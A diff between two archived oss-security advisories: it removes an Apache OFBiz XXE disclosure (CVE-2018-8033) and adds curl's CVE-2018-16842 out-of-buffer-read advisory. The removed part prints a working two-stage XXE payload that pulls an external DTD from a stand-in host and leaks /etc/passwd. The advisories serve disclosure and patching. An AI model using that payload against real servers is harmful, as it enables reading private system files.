@@ -1,58 +1,99 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/10/05/3
-Message-ID: <CAFqjAi154tZ3ZaMBs5FTHyJv8qp4PnyGMf_AcnYWuNg0woWvHw@mail.gmail.com>
-Date: Fri, 5 Oct 2018 15:58:13 +0300
-From: Taher Alkhateeb <slidingfilaments@...il.com>
-To: OFBiz development mailing list <dev@...iz.apache.org>, OFBiz user mailing list <user@...iz.apache.org>,  OFBiz security mailing list <security@...iz.apache.org>, Apache Security Team <security@...che.org>, announce@...che.org,  oss-security@...ts.openwall.com, James Parfet <jamesp@...dpointgroup.com>
-Subject: [SECURITY] CVE-2018-8033 Apache OFBiz XXE Vulnerability in HttpEngine
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/10/31/3
+Message-ID: <alpine.DEB.2.20.1810310754160.4385@tvnag.unkk.fr>
+Date: Wed, 31 Oct 2018 07:55:47 +0100 (CET)
+From: Daniel Stenberg <daniel@...x.se>
+To: curl security announcements -- curl users <curl-users@...l.haxx.se>, curl-announce@...l.haxx.se, libcurl hacking <curl-library@...l.haxx.se>, oss-security@...ts.openwall.com
+Subject: [SECURITY ADVISORY] curl - warning message out-of-buffer read
 Content-Type: text/plain; charset=utf-8
 
-Severity:
-Important
+warning message out-of-buffer read
+==================================
 
-Vendor:
-The Apache Software Foundation
+Project curl Security Advisory, October 31st 2018 -
+[Permalink](https://curl.haxx.se/docs/CVE-2018-16842.html)
 
-Versions Affected:
-OFBiz 16.11.01 to 16.11.04
+VULNERABILITY
+-------------
 
-Description:
-The OFBiz HTTP engine (org.apache.ofbiz.service.engine.HttpEngine.java)
-handles requests for HTTP services via the /webtools/control/httpService
-endpoint. Both POST and GET requests to the httpService endpoint may contain
-three parameters: serviceName, serviceMode, and serviceContext.
-The exploitation occurs by having DOCTYPEs pointing to external references
-that trigger a payload that returns secret information from the host.
+curl contains a heap out of buffer read vulnerability.
 
-Mitigation:
-Upgrade to 16.11.05
-or manually apply the following commits on branch 16
-r1833708
-r1836141
+The command line tool has a generic function for displaying warning and
+informational messages to stderr for various situations. For example if an
+unknown command line argument is used, or passed to it in a "config" file.
 
-Example:
-# The following payload may be used:
-<?xml version="1.0"?>
-<!DOCTYPE foo [
-<!ENTITY % request SYSTEM 'http://example.com/evil.xml'>
-%request;
-%secondstage;
-]>
-<r>&disclose;</r>
+This display function formats the output to wrap at 80 columns. The wrap logic
+is however flawed, so if a single word in the message is itself longer than 80
+bytes the buffer arithmetic calculates the remainder wrong and will end up
+reading behind the end of the buffer. This could lead to information
+disclosure or crash.
 
-# And then the remote file evil.xml has the following payload:
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % secondstage "<!ENTITY disclose SYSTEM 'file:///nonexistent/%file;'>">
-%secondstage;
-%disclose;
+This vulnerability could lead to a security issue if used in this or similar
+situations:
 
-The second stage payload specifies what file to disclose on the OFBiz server.
-It instructs the OFBiz server to look for a file in the path /nonexistent/.
-The server will throw a "File Not Found" error and then append the target file
-(/etc/passwd) to the error message.
+  1. a server somewhere uses the curl command line to run something
+  2. if it fails, it shows stderr to the user
+  3. the server takes user input for parts of its command line input
+  4. user provides something overly long that triggers this crash
+  5. the stderr output may now contain user memory contents that wasn't meant
+     to be available
 
-Credit:
-James Parfet <jamesp at mindpointgroup.com>
+We are not aware of any exploit of this flaw.
 
-References:
-http://ofbiz.apache.org/download.html#vulnerabilities
+INFO
+----
+
+This flaw exists in the command line tool only, not in libcurl.
+
+This bug was introduced in [commit
+d9ca9154d1](https://github.com/curl/curl/commit/d9ca9154d1), August 2005.
+
+The Common Vulnerabilities and Exposures (CVE) project has assigned the name
+CVE-2018-16842 to this issue.
+
+CWE-125: Out-of-bounds Read
+
+Severity: 3.3 (Low)
+
+AFFECTED VERSIONS
+-----------------
+
+- Affected versions: curl 7.14.1 to and including 7.61.1
+- Not affected versions: curl < 7.14.1 and >= 7.62.0
+
+curl is used by many applications, but not always advertised as such.
+
+THE SOLUTION
+------------
+
+A [patch for CVE-2018-16842](https://github.com/curl/curl/commit/d530e92f59ae9bb2d47066c3c460b25d2ffeb211)
+
+RECOMMENDATIONS
+---------------
+
+We suggest you take one of the following actions immediately, in order of
+preference:
+
+  A - Upgrade curl to version 7.62.0
+
+  B - Apply the patch to your version and rebuild
+
+TIME LINE
+---------
+
+It was reported to the curl project on October 27, 2018.  We contacted
+distros@...nwall on October 28.
+
+curl 7.62.0 was released on October 31 2018, coordinated with the publication
+of this advisory.
+
+CREDITS
+-------
+
+Reported by Brian Carpenter, Geeknik Labs. Patch by Daniel Stenberg.
+
+Thanks a lot!
+
+-- 
+
+  / daniel.haxx.se
